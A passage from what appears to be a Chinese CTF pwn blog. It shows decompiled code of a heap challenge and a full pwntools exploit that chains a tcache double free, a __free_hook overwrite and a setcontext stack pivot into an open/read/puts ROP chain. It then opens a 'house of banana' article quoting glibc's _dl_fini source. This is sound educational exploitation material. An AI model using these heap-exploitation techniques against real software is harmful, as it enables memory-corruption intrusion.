class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在delete时没有检测chunk_inuse就直接free了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1AB0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You only have 1 chances to change your child&#x27;s gender, left: %d\n&quot;</span>, dword_4010);</span><br><span class="line">  LODWORD(v0) = dword_4010;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input index?&quot;</span>);</span><br><span class="line">    LODWORD(v0) = input_int();</span><br><span class="line">    v2 = v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = chunk_arr[v0];</span><br><span class="line">      <span class="keyword">if</span> ( v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        --dword_4010;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Current gender:%s\n&quot;</span>, (chunk_arr[v2] + <span class="number">8LL</span>));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please rechoose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>);</span><br><span class="line">        v3 = input_int();</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v0 = (chunk_arr[v2] + <span class="number">8LL</span>);</span><br><span class="line">          *v0 = <span class="number">7958370</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v0 = (chunk_arr[v2] + <span class="number">8LL</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(v0, <span class="string">&quot;girl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;oho, you choose a invalid gender.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在改变性别时也是没有检测chunk_inuse，而且改变性别的位置正好是bk指针，所以可以实现tcache double free</p><p>解法1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">option</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(option), encoding=<span class="string">&#x27;utf8&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, gender, name</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please input index?&#x27;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;2.Girl:&quot;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(gender), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Please input your child&#x27;s name:&quot;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please input index?&#x27;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Please input your child&#x27;s new name:&quot;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please input index?&#x27;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please input index?&#x27;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, description</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please input index?&#x27;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;description:&quot;</span>)</span><br><span class="line">    r.send(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_gender</span>(<span class="params">idx, gender</span>):</span></span><br><span class="line">    menu(<span class="number">666</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please input index?&#x27;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;2.Girl:&quot;</span>)</span><br><span class="line">    r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(gender), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">1</span>, <span class="string">b&#x27;cml&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">change_gender(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0</span>, <span class="number">1</span>, <span class="string">b&#x27;cml&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;cml&#x27;</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">1</span>, <span class="string">b&#x27;cml&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Gender: &#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base=&gt;&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;cml&#x27;</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">1</span>, <span class="string">b&#x27;cml&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">change_name(<span class="number">0</span>, p64(heap_base+<span class="number">0x10</span>)[:-<span class="number">1</span>])</span><br><span class="line">create(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;cml&#x27;</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">14</span>+<span class="string">b&#x27;\x08&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Gender: &#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base=&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">setcontext_addr = libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">free_hook = libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base+libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">pop_rsi = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))</span><br><span class="line">pop_rdx_r12 = libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">ret_addr = libc_base+<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;ret&#x27;</span>)))</span><br><span class="line">gadget = libc_base+<span class="number">0x1546f0</span>+<span class="number">576</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x00007f3ddba96930 &lt;+576&gt;:mov    rdx,QWORD PTR [rdi+0x8]</span></span><br><span class="line"><span class="string">   0x00007f3ddba96934 &lt;+580&gt;:mov    QWORD PTR [rsp],rax</span></span><br><span class="line"><span class="string">   0x00007f3ddba96938 &lt;+584&gt;:call   QWORD PTR [rdx+0x20]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">bss = libc_base+libc.bss()+<span class="number">0x300</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x4c0</span></span><br><span class="line">rop_chain = p64(pop_rdi)+p64(flag_addr)+p64(open_addr)</span><br><span class="line">rop_chain += p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(bss) + \</span><br><span class="line">    p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">rop_chain += p64(pop_rdi)+p64(bss)+p64(puts_addr)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">1</span>, <span class="string">b&#x27;flag\x00\x00\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>, rop_chain)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">rop_chain_addr = heap_base+<span class="number">0x4d0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">4</span>, <span class="number">1</span>, <span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">arg_addr = heap_base+<span class="number">0x5e0</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">14</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xe8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(arg_addr)</span><br><span class="line">edit(<span class="number">2</span>, payload[:-<span class="number">1</span>])</span><br><span class="line">create(<span class="number">5</span>, <span class="number">1</span>, <span class="string">b&#x27;shell&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(arg_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(setcontext_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + \</span><br><span class="line">    p64(rop_chain_addr)+p64(setcontext_addr+<span class="number">334</span>-<span class="number">61</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">14</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xe8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">2</span>, payload[:-<span class="number">1</span>])</span><br><span class="line">create(<span class="number">6</span>, <span class="number">1</span>, p64(gadget)[:-<span class="number">1</span>])</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>解法2：</p><p>在我的<a href="https://cv196082.gitee.io/2022/02/10/GKCTF-2020-domo/">这篇文章</a>中，讲了另一个方式劫持栈，也就是通过environ泄漏栈地址，计算与main函数ret时的栈地址的偏移量进行劫持，这里主要是讲解gadget就不在赘述</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;现在的比赛，越来越卷了，所以出题人为了让选手难受一般都会开始沙盒这时候只能进行orw，不过在栈里面这种方式还是常见。但是在堆利用当中我们更多的是修改hook为system或者one_gadget，为了能够实现orw就出现了新的手法 堆中栈迁移&lt;/p</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="堆利用技巧" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    
    <category term="tcache double free" scheme="https://cv196082.gitee.io/tags/tcache-double-free/"/>
    
  </entry>
  
  <entry>
    <title>house of banana</title>
    <link href="https://cv196082.gitee.io/2022/03/07/house-of-banana/"/>
    <id>https://cv196082.gitee.io/2022/03/07/house-of-banana/</id>
    <published>2022-03-07T14:34:36.000Z</published>
    <updated>2022-03-07T14:55:25.911Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这个堆利用方式相较于以往的利用方式存在利用目标的不同，这一方式的利用我感觉比较适合与glibc2.31之后，比较之前都可以直接用FSOP，但是在2.31之后FSOP的利用方式就是house of pig不过如果题目禁止了__free_hook之类的被篡改的话也就没法利用了，而house of banana把攻击层面转向了ld</p></blockquote><p>首先，在main执行之后会执行__libc_csu_fini所以我们首先了解这个函数</p><h2 id="如何执行fini-array中的函数"><a href="#如何执行fini-array中的函数" class="headerlink" title="如何执行fini-array中的函数"></a>如何执行fini-array中的函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">     copy the pointers in.  */</span></span><br><span class="line">  struct link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">     the main namespace.  */</span></span><br><span class="line">  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">     lock.  */</span></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">     the front.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span 